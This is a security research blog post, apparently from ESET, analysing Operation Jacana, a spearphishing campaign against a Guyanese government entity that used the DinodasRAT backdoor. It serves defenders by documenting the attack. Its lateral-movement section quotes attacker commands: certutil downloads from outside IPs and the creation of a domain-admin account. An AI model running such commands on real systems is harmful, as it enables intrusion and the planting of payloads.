    <h1 class="page-headline">Operation Jacana: Foundling hobbits in Guyana</h1>    <p class="sub-title">ESET researchers discovered a cyberespionage campaign against a governmental entity in Guyana</p>
    
    <div class="article-authors d-flex flex-wrap"><div class="article-author d-flex"><a href="/en/our-experts/fernando-tavella/" title="Fernando Tavella"><picture><source srcset="https://web-assets.esetstatic.com/tn/-x45/wls/2023/03/fernando.png" media="(max-width: 768px)" /><img class="author-image me-3"  src="https://web-assets.esetstatic.com/tn/-x45/wls/2023/03/fernando.png" alt="Fernando Tavella"  /></picture></a><div class="author-text"><p><a href="/en/our-experts/fernando-tavella/" title="Fernando Tavella"><b>Fernando Tavella</b></a></p></div></div></div>

        <span class="d-none d-lg-inline">&nbsp;&bull;&nbsp;</span>
        <span class="d-inline d-lg-none">, </span>
        <span>15 min. read</span>
    </p>

    <div class="hero-image-container">
        <picture><source srcset="https://web-assets.esetstatic.com/tn/-x266/wls/2023/2023-10/eset-research-operation-jacana-guyana-cyberespionage.jpeg" media="(max-width: 768px)" /><source srcset="https://web-assets.esetstatic.com/tn/-x425/wls/2023/2023-10/eset-research-operation-jacana-guyana-cyberespionage.jpeg" media="(max-width: 1120px)" /><img class="hero-image"  src="https://web-assets.esetstatic.com/tn/-x700/wls/2023/2023-10/eset-research-operation-jacana-guyana-cyberespionage.jpeg" alt="Operation Jacana: Foundling hobbits in Guyana"  /></picture>    </div>

                    <div class="article-body">
    <p>In February 2023, ESET researchers detected a spearphishing campaign targeting a governmental entity in Guyana. While we haven&rsquo;t been able to link the campaign, which we named Operation Jacana, to any specific APT group, we believe with medium confidence that a China-aligned threat group is behind this incident.</p>
<p>In the attack, the operators used a previously undocumented C++ backdoor that can exfiltrate files, manipulate Windows registry keys, execute CMD commands, and more. We named the backdoor DinodasRAT based on the victim identifier it sends to its C&amp;C: the string always begins with <span style="font-family: courier new, courier, monospace;">Din</span>, which reminded us of the hobbit Dinodas from the Lord of the Rings.</p>
<blockquote>
<p><strong>Key points of this blogpost:</strong></p>
<ul>
<li><em>Operation Jacana is a targeted cyberespionage campaign against a Guyanese governmental entity.</em></li>
<li><em>After the initial compromise via spearphishing emails, the attackers proceeded to move laterally through the victim&rsquo;s internal network.</em></li>
<li><em>To extract sensitive data, the operators used a previously undocumented backdoor we named DinodasRAT.</em></li>
<li><em>DinodasRAT encrypts the information it sends to the C&amp;C using the Tiny Encryption Algorithm (TEA).</em></li>
<li><em>Apart from DinodasRAT, the attackers also deployed Korplug, leading us to suspect that China-aligned operators are behind this operation.</em></li>
</ul>
</blockquote>
<p>This campaign was targeted, as the threat actors crafted their emails specifically to entice their chosen victim organization. After successfully compromising the first couple of machines with DinodasRAT, the operators proceeded to move laterally and breach the target&rsquo;s internal network, where they again deployed the DinodasRAT backdoor, along with additional malicious tools, among them a variant of Korplug (aka PlugX). The overview of the compromise flow in Operation Jacana is shown in Figure 1.</p>
<figure class="image"><img title="Figure 1. Operation Jacana compromise flow" src="https://web-assets.esetstatic.com/wls/2023/2023-09/operation-jacana/01-compromise-flow.png" alt="01_compromise_flow" width="" height="" />
<figcaption><em>Figure 1. Operation Jacana compromise flow</em></figcaption>
</figure>
<h2>Attribution</h2>
<p>As of this writing, we have not been able to attribute Operation Jacana to any known group. However, thanks to a clue we found, we feel that we aren&rsquo;t completely in the dark regarding the perpetrators. During the attack, the threat actors deployed a variant of Korplug (aka PlugX), which is common to China-aligned groups &ndash; for example, <a href="https://www.welivesecurity.com/2022/03/23/mustang-panda-hodur-old-tricks-new-korplug-variant/" target="_blank" rel="noopener">Mustang Panda&rsquo;s Hodur: Old tricks, new Korplug variant</a>.</p>
<p>While our attribution to a China-aligned threat actor is made with only medium confidence, the hypothesis is further supported by recent developments in Guyana&ndash;China diplomatic relations. In February 2023, the same month that Operation Jacana occurred, the Special Organised Crime Unit (SOCU) of Guyana arrested three people in a money laundering investigation involving Chinese companies, an act disputed by the local Chinese embassy. Additionally, as part of the Belt and Road Initiative, China has economic interests in Guyana.&nbsp;</p>
<h2>Initial Access</h2>
<p>As the first step in breaching their victim&rsquo;s network, the threat actors behind Operation Jacana sent the target organization spearphishing emails referencing Guyanese public affairs. We observed the following subject lines:</p>
<ul>
<li><span style="font-family: courier new, courier, monospace;">President Mohamed Irfaan Ali's Official Visit to Nassau, The Bahamas</span></li>
<li><span style="font-family: courier new, courier, monospace;">Guyanese fugitive in Vietnam</span></li>
</ul>
<p>Based on the email subjects, the operators must have been following the political goings-on in Guyana &ndash; the time we registered new detections at the targeted governmental entity coincided with the Guyanese president&rsquo;s attendance of the <a href="https://dpi.gov.gy/president-ali-arrives-for-44th-caricom-heads-of-govt-meeting-in-bahamas/" target="_blank" rel="noopener">CARICOM </a>conference in Nassau.</p>
<p>The spearphishing emails contained a link that, when clicked, downloaded a ZIP file from <span style="font-family: courier new, courier, monospace;">https://fta.moit.gov[.]vn/file/people.zip</span>. Since a domain ending with <span style="font-family: courier new, courier, monospace;">gov.vn</span> indicates a Vietnamese governmental website, we believe that the operators were able to compromise another governmental entity and use it to host their malware samples. We have notified the VNCERT about the compromised infrastructure.</p>
<p>Once the victim extracted the ZIP file, which wasn&rsquo;t password protected, and launched the contained executable, they became compromised with the DinodasRAT malware. The extracted filenames are related to the phishing email subject lines:</p>
<ul>
<li><span style="font-family: courier new, courier, monospace;">Guyanese fugitive in Vietnam20220101to20230214Guyanese fugitive in Vietnam.docx.exe</span></li>
<li><span style="font-family: courier new, courier, monospace;">The Bahamas/President Mohamed Irfaan Ali&rsquo;s Official Visit to Nassau, The Bahamas.doc.exe</span></li>
</ul>
<h2>Lateral Movement</h2>
<p>After breaching their target, the attackers proceeded to move across the victim&rsquo;s internal network. According to our telemetry, <span style="font-family: courier new, courier, monospace;">BAT/Impacket.M</span> and related detections were triggered in the network, which points to the use of <a href="https://github.com/fortra/impacket" target="_blank" rel="noopener">Impacket</a>, or a similar WMI-based lateral movement tool.&nbsp;</p>
<p>Some of the commands the attackers executed on the network include:</p>
<ul>
<li><span style="font-family: courier new, courier, monospace;">certutil -urlcache -split http://23.106.123[.]166/vmtools.rar</span></li>
<li><span style="font-family: courier new, courier, monospace;">net user test8 Test123.. /add /do</span></li>
<li><span style="font-family: courier new, courier, monospace;">net group "domain admins" test8 /add /do</span></li>
<li><span style="font-family: courier new, courier, monospace;">certutil -urlcache -split -f http://23.106.122[.]5/windowsupdate.txt c:\programdata\windowsupdate.txt</span></li>

<h2>Toolset</h2>
<h3>DinodasRAT</h3>
<p>DinodasRAT is a previously undocumented remote access trojan developed in C++ with various capabilities that allow an attacker to spy on and collect sensitive information from a victim&rsquo;s computer.&nbsp;</p>
<p>When executed, the malware first checks whether three arguments were passed. If present, these arguments must contain the following information in the following order:</p>
<ol>
<li>the letter <span style="font-family: courier new, courier, monospace;">d</span>,</li>
<li>a number, which is a process ID, and</li>
<li>a full file path.</li>
</ol>
<p>If all three arguments were passed, DinodasRAT terminates the process represented by the process ID using the Windows API <span style="font-family: courier new, courier, monospace;">TerminateProcess </span>then uses the Windows API <span style="font-family: courier new, courier, monospace;">DeleteFileW</span> to delete the file passed in the third argument. After this, the process stops its execution by using the C++ standard library <span style="font-family: courier new, courier, monospace;">exit</span> function. This is most likely intended as an uninstall function.</p>
<p>If no arguments were passed, DinodasRAT continues its execution by creating a mutex named client and checks for the existence of the conventional Windows directory <span style="font-family: courier new, courier, monospace;">C:\ProgramData</span>. If it exists, the malware creates a subdirectory named Application Doc, which is used to allocate a configuration file and other files related to the backdoor. In case the Windows directory doesn&rsquo;t exist, DinodasRAT creates a path in the root directory called <span style="font-family: courier new, courier, monospace;">Program.Files\Application.Doc</span>. The strings <span style="font-family: courier new, courier, monospace;">Application Doc</span>, <span style="font-family: courier new, courier, monospace;">ProgramData </span>and <span style="font-family: courier new, courier, monospace;">Program.Files\Application.Doc</span> are encrypted using the <a href="https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm" target="_blank" rel="noopener">Tiny Encryption Algorithm</a> (TEA).</p>
<p><span style="font-family: courier new, courier, monospace;">The Application Doc</span> directory is created with the attributes Read-only and Hidden. Inside of <span style="font-family: courier new, courier, monospace;">Application Doc</span>, DinodasRAT creates two subdirectories, named <span style="font-family: courier new, courier, monospace;">0</span> and <span style="font-family: courier new, courier, monospace;">1</span>. Once the directory exists, the malware spawns three threads used for data collection and exfiltration. A detailed description of their behavior is given in Table 1.</p>

<h3>TEA: Tiny Encryption Algorithm</h3>
<p>DinodasRAT uses TEA to decrypt some of its strings, as well as to encrypt/decrypt data sent to, or received from, its C&amp;C server. TEA, or Tiny Encryption Algorithm, is a simple block cipher, noted for its ease of implementation in software and hardware. For example, the <a href="https://link.springer.com/content/pdf/10.1007/3-540-60590-8_29.pdf?pdf=inline%20link" target="_blank" rel="noopener">original reference implementation</a> of its encode function comprises just a few lines of C code, with a very short setup time and no tables of preset values. DinodasRAT employs the algorithm in the cipher-block chaining (CBC) mode. In some cases, the encrypted data is further encoded with base64 before being sent to the C&amp;C server.</p>

<h3>C&amp;C communication and malicious activity</h3>
<p>In order to communicate with the C&amp;C server, DinodasRAT uses the Winsock library to create a socket that uses the TCP protocol. Although TCP is the default protocol used to send and receive information from the C&amp;C server, we have seen that DinodasRAT is capable of changing to the UDP protocol.</p>
<p>The backdoor also creates various threads for different purposes, such as manipulating a received command to execute on the victim&rsquo;s machine. Hence, in order to maintain synchronized communication, DinodasRAT makes use of Windows event objects by using Windows API functions like <span style="font-family: courier new, courier, monospace;">CreateEventW</span>, <span style="font-family: courier new, courier, monospace;">SetEventW</span>, and <span style="font-family: courier new, courier, monospace;">WaitForSingleObject</span>.</p>
<p>To start the main communication with the C&amp;C server, DinodasRAT sends a packet with basic information about the victim&rsquo;s machine and its configuration, such as:</p>
<ul>
<li>Windows version,</li>
<li>OS architecture,</li>
<li>username,</li>
<li>malware execution path encoded in base64, and</li>
<li>a value used for the UDP protocol, which by default is <span style="font-family: courier new, courier, monospace;">800</span>.</li>
</ul>
<p>Figure 3 shows not only basic information collected about the victim, but also the ID generated by the malware, which serves as a victim identifier for the C&amp;C server.</p>
<figure class="image"><img title="Figure 3. Basic information before its encryption" src="https://web-assets.esetstatic.com/wls/2023/2023-09/operation-jacana/figure-3-basic-information-before-its-encryption.png" alt="Figure 3 Basic information before its encryption" width="" height="" />
<figcaption><em>Figure 3. Basic information before its encryption</em></figcaption>
</figure>
<p>All the information that DinodasRAT sends to the C&amp;C server via the TCP protocol is TEA encrypted. In addition to that, some of the information is also base64 encoded.</p>

<ul>
<li>First byte: an ID possibly to indicate whether the data is TEA encrypted (<span style="font-family: courier new, courier, monospace;">0x30</span>) or base64 encoded and TEA encrypted (<span style="font-family: courier new, courier, monospace;">0x32</span>).</li>
<li>Next DWORD: encrypted data size.</li>
<li>Remaining bytes: encrypted data.</li>
</ul>

<p>The attackers also used other tools apart from DinodasRAT during the intrusion:</p>
<ul>
<li>A variant of Korplug (aka PlugX) &ndash; A backdoor typically used by China-aligned threat groups.</li>
<li>A <a href="https://www.softether.org/" target="_blank" rel="noopener">SoftEther VPN</a> client. This was probably used to proxy local ports, such as RDP, to the C&amp;C server.</li>
</ul>
<h2>Conclusion</h2>
<p>Operation Jacana is a cyberespionage campaign that impacted a governmental entity in Guyana. We believe with medium confidence that it was conducted by a China-aligned APT group.</p>
<p>The attackers used a combination of previously unknown tools, such as DinodasRAT, and more traditional backdoors such as Korplug.</p>
<p>Based on the spearphishing emails used to gain initial access to the victim&rsquo;s network, the operators are keeping track of the geopolitical activities of their victims to increase the likelihood of their operation's success.</p>
